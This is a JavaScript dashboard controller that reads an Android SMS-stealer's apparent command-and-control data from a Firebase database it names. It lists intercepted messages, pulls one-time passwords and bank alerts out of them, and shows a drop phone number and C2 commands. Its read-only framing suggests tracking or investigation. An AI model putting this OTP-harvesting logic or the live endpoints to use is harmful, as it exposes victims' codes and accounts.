/**
 * Cupertino (iOS) App Controller for Hacker Tracker
 * Target: 03e768e104ef026d
 * Strict Read-Only GET
 */

const CONFIG = {
  deviceId: '03e768e104ef026d',
  firebaseBase: 'https://r-cha-222-default-rtdb.firebaseio.com',
  pageSize: 25,
};

const state = {
  activeTab: 'paneOverview',
  activeFilter: 'all',
  searchQuery: '',
  page: 1,
  allMessages: [],
  filteredMessages: [],
  selectedMessage: null,
  events: [],
  timer: null,
};

// DOM references
const dom = {
  pageTitle: document.getElementById('pageTitle'),
  statusDot: document.getElementById('statusDot'),
  copyIdBtn: document.getElementById('copyIdBtn'),
  copyTag: document.getElementById('copyTag'),
  syncTime: document.getElementById('syncTime'),
  refreshBtn: document.getElementById('refreshBtn'),
  chipBattery: document.getElementById('chipBattery'),
  chipNetwork: document.getElementById('chipNetwork'),
  tabMsgBadge: document.getElementById('tabMsgBadge'),
  
  // Overview
  ovStatus: document.getElementById('ovStatus'),
  ovBattery: document.getElementById('ovBattery'),
  ovIp: document.getElementById('ovIp'),
  ovPhone: document.getElementById('ovPhone'),
  ovModel: document.getElementById('ovModel'),
  ovOs: document.getElementById('ovOs'),
  ovStorage: document.getElementById('ovStorage'),
  ovCmd: document.getElementById('ovCmd'),
  ovLiveness: document.getElementById('ovLiveness'),
  ovDropPhone: document.getElementById('ovDropPhone'),
  ovSilentSmsStatus: document.getElementById('ovSilentSmsStatus'),
  ovBadgeMsgCount: document.getElementById('ovBadgeMsgCount'),
  btnGoToMessages: document.getElementById('btnGoToMessages'),
  btnGoToCommands: document.getElementById('btnGoToCommands'),
  btnGoToTimeline: document.getElementById('btnGoToTimeline'),

  // Messages Tab
  msgSearchInput: document.getElementById('msgSearchInput'),
  msgClearSearch: document.getElementById('msgClearSearch'),
  messagesStream: document.getElementById('messagesStream'),
  segAllCount: document.getElementById('segAllCount'),
  segOtpCount: document.getElementById('segOtpCount'),
  segBankCount: document.getElementById('segBankCount'),
  segCarrierCount: document.getElementById('segCarrierCount'),
  pagingSummary: document.getElementById('pagingSummary'),
  msgPrevBtn: document.getElementById('msgPrevBtn'),
  msgNextBtn: document.getElementById('msgNextBtn'),
  msgPageIndicator: document.getElementById('msgPageIndicator'),

  // Commands Tab
  cmdActiveText: document.getElementById('cmdActiveText'),
  cmdSimSlot: document.getElementById('cmdSimSlot'),
  cmdProbe: document.getElementById('cmdProbe'),
  cmdResponse: document.getElementById('cmdResponse'),
  whPhone: document.getElementById('whPhone'),
  whDispatched: document.getElementById('whDispatched'),
  whPayloadText: document.getElementById('whPayloadText'),

  // Timeline Tab
  timelineFeed: document.getElementById('timelineFeed'),

  // Action Sheet (Modal)
  msgSheetBackdrop: document.getElementById('msgSheetBackdrop'),
  sheetSender: document.getElementById('sheetSender'),
  sheetTime: document.getElementById('sheetTime'),
  sheetBody: document.getElementById('sheetBody'),
  sheetOtpBox: document.getElementById('sheetOtpBox'),
  sheetOtpVal: document.getElementById('sheetOtpVal'),
  btnCopySheetOtp: document.getElementById('btnCopySheetOtp'),
  btnCopySheetText: document.getElementById('btnCopySheetText'),
  btnCloseSheet: document.getElementById('btnCloseSheet'),
};

document.addEventListener('DOMContentLoaded', () => {
  setupTabs();
  setupEvents();
  fetchLiveTelemetry();
  loadTimeline();
  startAutoRefresh();
});

function setupTabs() {
  document.querySelectorAll('.tab-item').forEach(btn => {
    btn.addEventListener('click', () => {
      switchTab(btn.dataset.tab, btn.dataset.title);
    });
  });

  dom.btnGoToMessages.addEventListener('click', () => switchTab('paneMessages', 'Messages'));
  dom.btnGoToCommands.addEventListener('click', () => switchTab('paneCommands', 'C2 Commands'));
  dom.btnGoToTimeline.addEventListener('click', () => switchTab('paneTimeline', 'Activity Log'));
}

function switchTab(tabId, title) {
  state.activeTab = tabId;
  dom.pageTitle.textContent = title;

  document.querySelectorAll('.tab-item').forEach(b => {
    b.classList.toggle('active', b.dataset.tab === tabId);
  });

  document.querySelectorAll('.tab-pane').forEach(p => {
    p.classList.toggle('active', p.id === tabId);
  });

  // If switched to messages, make sure list is rendered
  if (tabId === 'paneMessages') {
    renderMessagesList();
  }
}

function setupEvents() {
  dom.refreshBtn.addEventListener('click', () => fetchLiveTelemetry());

  dom.copyIdBtn.addEventListener('click', () => {
    navigator.clipboard.writeText(CONFIG.deviceId);
    dom.copyTag.textContent = 'COPIED!';
    setTimeout(() => { dom.copyTag.textContent = 'copy'; }, 1500);
  });

  // Search input in Messages
  dom.msgSearchInput.addEventListener('input', (e) => {
    state.searchQuery = e.target.value.trim().toLowerCase();
    dom.msgClearSearch.style.display = state.searchQuery ? 'block' : 'none';
    state.page = 1;
    applyMessageFilters();
  });

  dom.msgClearSearch.addEventListener('click', () => {
    dom.msgSearchInput.value = '';
    state.searchQuery = '';
    dom.msgClearSearch.style.display = 'none';
    state.page = 1;
    applyMessageFilters();
  });

  // Segmented control in Messages
  document.querySelectorAll('.seg-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.seg-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      state.activeFilter = btn.dataset.filter;
      state.page = 1;
      applyMessageFilters();
    });
  });

  // Pagination
  dom.msgPrevBtn.addEventListener('click', () => {
    if (state.page > 1) {
      state.page--;
      renderMessagesList();
    }
  });

  dom.msgNextBtn.addEventListener('click', () => {
    const totalPages = Math.ceil(state.filteredMessages.length / CONFIG.pageSize) || 1;
    if (state.page < totalPages) {
      state.page++;
      renderMessagesList();
    }
  });

  // Sheet close
  dom.btnCloseSheet.addEventListener('click', closeSheet);
  dom.msgSheetBackdrop.addEventListener('click', (e) => {
    if (e.target === dom.msgSheetBackdrop) closeSheet();
  });

  dom.btnCopySheetText.addEventListener('click', () => {
    if (state.selectedMessage) {
      navigator.clipboard.writeText(state.selectedMessage.message);
      dom.btnCopySheetText.textContent = 'Copied!';
      setTimeout(() => { dom.btnCopySheetText.textContent = 'Copy Message Text'; }, 1500);
    }
  });

  dom.btnCopySheetOtp.addEventListener('click', () => {
    if (state.selectedMessage && state.selectedMessage.extractedOtp) {
      navigator.clipboard.writeText(state.selectedMessage.extractedOtp);
      dom.btnCopySheetOtp.textContent = 'Copied!';
      setTimeout(() => { dom.btnCopySheetOtp.textContent = 'Copy OTP'; }, 1500);
    }
  });
}

function startAutoRefresh() {
  if (state.timer) clearInterval(state.timer);
  state.timer = setInterval(fetchLiveTelemetry, 15000);
}

async function safeGet(url) {
  const ctrl = new AbortController();
  const tid = setTimeout(() => ctrl.abort(), 10000);
  const res = await fetch(url, { method: 'GET', signal: ctrl.signal });
  clearTimeout(tid);
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  return await res.json();
}

async function fetchLiveTelemetry() {
  dom.refreshBtn.textContent = '...';

  try {
    const [client, cmd, userData, msgs] = await Promise.all([
      safeGet(`${CONFIG.firebaseBase}/clients/${CONFIG.deviceId}.json`).catch(() => null),
      safeGet(`${CONFIG.firebaseBase}/commands/${CONFIG.deviceId}.json`).catch(() => null),
      safeGet(`${CONFIG.firebaseBase}/user_data/${CONFIG.deviceId}.json`).catch(() => null),
      safeGet(`${CONFIG.firebaseBase}/messages/${CONFIG.deviceId}.json`).catch(() => null),
    ]);

    updateVitals(client, cmd, userData);
    processMessages(msgs);
    dom.syncTime.textContent = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  } catch (err) {
    console.warn('Live fetch error, falling back to local snapshot:', err);
    try {
      const fallback = await safeGet('data/latest.json');
      updateVitals(fallback.client || (fallback.raw && fallback.raw.client), null, null);
      const arch = await safeGet('data/messages_archive.json');
      processMessages(arch.messages || {});
      dom.syncTime.textContent = 'Snapshot';
    } catch (e) {
      dom.syncTime.textContent = 'Offline';
    }
  } finally {
    dom.refreshBtn.textContent = 'Refresh';
  }
}

function updateVitals(client, cmd, userData) {
  const isOnline = client && client.status === true;
  dom.statusDot.className = `ios-dot ${isOnline ? 'online' : 'offline'}`;
  dom.ovStatus.textContent = isOnline ? 'Online (Active C2)' : 'Offline';
  dom.ovStatus.className = `cell-value status-text ${isOnline ? 'online' : 'offline'}`;

  const battery = (client && client.battery) || '--';
  dom.ovBattery.textContent = battery;
  dom.chipBattery.textContent = `🔋 ${battery}`;

  const ip = (client && client.ip_address) || '--';
  dom.ovIp.textContent = ip;

  const carrier = (client && client.service_provider) || 'Airtel';
  const phone = (client && client.mobNo) || '--';
  dom.ovPhone.textContent = `${phone} (${carrier})`;
  dom.chipNetwork.textContent = `📶 ${carrier}`;

  const model = (client && client.modelName) || 'OnePlus CPH2467';
  dom.ovModel.textContent = model;

  const os = client && client.androidV ? `Android ${client.androidV} (SDK ${client.sdkV || '35'})` : 'Android 15';
  dom.ovOs.textContent = os;

  const storage = (client && client.storage) || '104GB';
  dom.ovStorage.textContent = `${storage} (SD Card: ${client && client.isSdCard ? 'Present' : 'None'})`;

  // Commands
  const userCmd = (userData && userData.command) || 'forward status';
  const slot = userData && userData.simSlot !== undefined ? userData.simSlot : '0';
  dom.ovCmd.textContent = `${userCmd} (Slot: ${slot})`;
  dom.cmdActiveText.textContent = userCmd;
  dom.cmdSimSlot.textContent = slot;

  const ping = (cmd && cmd.checkLiveness && cmd.checkLiveness.text) || 'ping_magic_scan';
  const pong = (client && client.webhookEvent && client.webhookEvent.checkLiveness && client.webhookEvent.checkLiveness.text) || 'pong';
  dom.ovLiveness.textContent = `${ping} ⇄ ${pong}`;
  dom.cmdProbe.textContent = ping;
  dom.cmdResponse.textContent = pong;

  const whSms = client && client.webhookEvent && client.webhookEvent.sendSms;
  if (whSms) {
    dom.ovDropPhone.textContent = whSms.to || '+919560241900';
    dom.whPhone.textContent = whSms.to || '+919560241900';
    dom.whDispatched.textContent = whSms.isSended ? 'true (Delivered)' : 'false (Queued)';
    dom.whPayloadText.textContent = whSms.message || 'HDFCUPI ...';
  }
}

function processMessages(rawMsgs) {
  if (!rawMsgs) return;

  const list = [];
  const otpRe = /\b(otp|code|pin|password|verification|verify)\b/i;
  const numRe = /\b(\d{4,8})\b/;
  const bankRe = /\b(upi|inr|rs\.?|debited|credited|balance|a\/c|account|bank|pnb|sbi|hdfc|icici)\b/i;

  let otpCount = 0;
  let bankCount = 0;
  let carrierCount = 0;

  for (const [key, val] of Object.entries(rawMsgs)) {
    if (!val || typeof val !== 'object') continue;
    const body = val.message || '';
    const sender = (val.sender || 'UNKNOWN').toUpperCase();

    const isOtp = otpRe.test(body);
    const isBank = bankRe.test(body) || sender.includes('PNB') || sender.includes('BANK');
    const isCarrier = sender.includes('AIRTEL') || sender.includes('JIO') || sender.includes('6500');

    let extractedOtp = null;
    if (isOtp) {
      const match = body.match(numRe);
      if (match) extractedOtp = match[1];
    }

    if (isOtp) otpCount++;
    if (isBank) bankCount++;
    if (isCarrier) carrierCount++;

    list.push({
      id: val.id || key,
      sender: val.sender || 'UNKNOWN',
      message: body,
      time: val.dateTime || '',
      isOtp,
      isBank,
      isCarrier,
      extractedOtp,
    });
  }

  // Sort newest first
  list.sort((a, b) => {
    const na = Number(a.id);
    const nb = Number(b.id);
    if (!isNaN(na) && !isNaN(nb)) return nb - na;
    return String(b.id).localeCompare(String(a.id));
  });

  state.allMessages = list;
  dom.tabMsgBadge.textContent = list.length;
  dom.ovBadgeMsgCount.textContent = `${list.length} ›`;

  dom.segAllCount.textContent = list.length;
  dom.segOtpCount.textContent = otpCount;
  dom.segBankCount.textContent = bankCount;
  dom.segCarrierCount.textContent = carrierCount;

  applyMessageFilters();
}

function applyMessageFilters() {
  const f = state.activeFilter;
  const q = state.searchQuery;

  state.filteredMessages = state.allMessages.filter(m => {
    if (f === 'otp' && !m.isOtp) return false;
    if (f === 'bank' && !m.isBank) return false;
    if (f === 'carrier' && !m.isCarrier) return false;

    if (q) {
      const s = m.sender.toLowerCase();
      const b = m.message.toLowerCase();
      return s.includes(q) || b.includes(q) || (m.time && m.time.toLowerCase().includes(q));
    }
    return true;
  });

  renderMessagesList();
}

function renderMessagesList() {
  const total = state.filteredMessages.length;
  const totalPages = Math.ceil(total / CONFIG.pageSize) || 1;

  if (state.page > totalPages) state.page = totalPages;
  if (state.page < 1) state.page = 1;

  const start = (state.page - 1) * CONFIG.pageSize;
  const end = Math.min(start + CONFIG.pageSize, total);
  const items = state.filteredMessages.slice(start, end);

  dom.pagingSummary.textContent = `Showing ${total === 0 ? 0 : start + 1} - ${end} of ${total} messages`;
  dom.msgPageIndicator.textContent = `${state.page} / ${totalPages}`;
  dom.msgPrevBtn.disabled = state.page <= 1;
  dom.msgNextBtn.disabled = state.page >= totalPages;

  if (items.length === 0) {
    dom.messagesStream.innerHTML = '<div class="ios-empty-state">No matching messages found.</div>';
    return;
  }

  let html = '';
  for (const m of items) {
    let avatarClass = 'avatar-default';
    if (m.isOtp) avatarClass = 'avatar-otp';
    else if (m.isBank) avatarClass = 'avatar-bank';
    else if (m.isCarrier) avatarClass = 'avatar-carrier';

    const initials = getInitials(m.sender);

    const otpPill = m.extractedOtp ? `<span class="msg-otp-pill">OTP: ${m.extractedOtp}</span>` : '';

    html += `
      <div class="ios-msg-row" onclick="openMessageDetail('${m.id}')">
        <div class="msg-avatar ${avatarClass}">${initials}</div>
        <div class="msg-content-wrap">
          <div class="msg-header-line">
            <span class="msg-sender-title">${m.sender}</span>
            <span class="msg-time-label">${formatTime(m.time)}</span>
          </div>
          <div class="msg-body-preview">
            ${otpPill}${escapeHtml(m.message)}
          </div>
        </div>
      </div>
    `;
  }

  dom.messagesStream.innerHTML = html;
}

function getInitials(sender) {
  if (!sender) return '??';
  const clean = sender.replace(/[^A-Za-z0-9]/g, '');
  if (clean.length >= 3) return clean.substring(0, 3);
  return clean.substring(0, 2);
}

function formatTime(timeStr) {
  if (!timeStr) return '';
  // Convert "19-11-2026 | 04:58 pm" -> "04:58 PM"
  if (timeStr.includes('|')) {
    return timeStr.split('|')[1].trim().toUpperCase();
  }
  return timeStr;
}

function escapeHtml(text) {
  return (text || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

window.openMessageDetail = function(id) {
  const m = state.allMessages.find(item => String(item.id) === String(id));
  if (!m) return;
  state.selectedMessage = m;

  dom.sheetSender.textContent = m.sender;
  dom.sheetTime.textContent = m.time;
  dom.sheetBody.textContent = m.message;

  if (m.extractedOtp) {
    dom.sheetOtpBox.style.display = 'flex';
    dom.sheetOtpVal.textContent = m.extractedOtp;
  } else {
    dom.sheetOtpBox.style.display = 'none';
  }

  dom.msgSheetBackdrop.classList.add('open');
};

function closeSheet() {
  dom.msgSheetBackdrop.classList.remove('open');
}

async function loadTimeline() {
  try {
    const events = await safeGet('data/events.json').catch(() => []);
    state.events = Array.isArray(events) ? events : [];
    renderTimeline();
  } catch (e) {
    console.warn('Could not load events timeline:', e);
  }
}

function renderTimeline() {
  if (!state.events || state.events.length === 0) {
    dom.timelineFeed.innerHTML = '<div class="ios-empty-state">No recorded telemetry events.</div>';
    return;
  }

  let html = '';
  for (const ev of state.events) {
    const timeStr = ev.timestamp ? new Date(ev.timestamp).toLocaleString() : 'Recent';
    html += `
      <div class="timeline-card ${ev.type || ''}">
        <div class="timeline-time">${timeStr} · ${ev.type || 'EVENT'}</div>
        <div class="timeline-detail">${ev.detail || 'State change recorded'}</div>
      </div>
    `;
  }
  dom.timelineFeed.innerHTML = html;
}
